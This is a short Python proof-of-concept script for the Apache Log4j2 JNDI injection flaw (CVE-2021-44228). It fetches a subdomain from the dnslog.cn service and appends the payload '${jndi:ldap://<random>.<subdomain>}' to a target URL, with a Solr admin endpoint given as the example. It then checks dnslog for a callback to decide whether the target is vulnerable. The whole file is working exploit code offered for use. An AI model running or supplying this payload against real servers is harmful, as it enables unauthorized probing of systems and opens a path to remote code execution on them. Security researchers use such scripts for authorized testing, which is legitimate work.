#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/10 11:28
# Author     : yunkong
# FileName   : cve_2021_44228_poc.py
# Description:
#
# Exploit Title: Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228)
# Version: <= 2.14.1
# CVE: CVE-2021-44228

from time import sleep
from requests import session
import random
import string
import urllib3

urllib3.disable_warnings()  # 忽略https证书告警


def get_random(lens: int):
    # 定义可选的字符集
    characters = string.ascii_lowercase + string.digits

    return ''.join(random.choice(characters) for i in range(lens))


def chack_cve_2021_44228(target_url):
    # 定义session对象
    sess = session()

    # 获取dnslog生成的子域名
    response = sess.get(url="http://www.dnslog.cn/getdomain.php")
    subdns = response.text

    # 构造payload连接
    random_str = get_random(6)
    payload = "${jndi:ldap://%s.%s}" % (random_str, subdns)
    print(f'sending exploit payload "{payload}" to "{target_url}"')
    payload_url = target_url + payload

    # 发送payload
    sess.request(method="GET", url=payload_url, timeout=12)
    sleep(10)

    # 获取dnslog结果
    res = sess.request(method="GET", url="http://www.dnslog.cn/getrecords.php?t=" + subdns.split(".")[0])
    if random_str in res.text:
        return True
    else:
        return False


def vuln_scan_start(target_url):
    if chack_cve_2021_44228(target_url):
        print(f"[+] Target: {target_url} CVE-2021-44228 may exist！！！")
    else:
        print(f"[-] Target: {target_url} CVE-2021-44228 may not exist！！！")


# vuln_poc('http://192.168.12.130:8983/solr/admin/cores?action=')
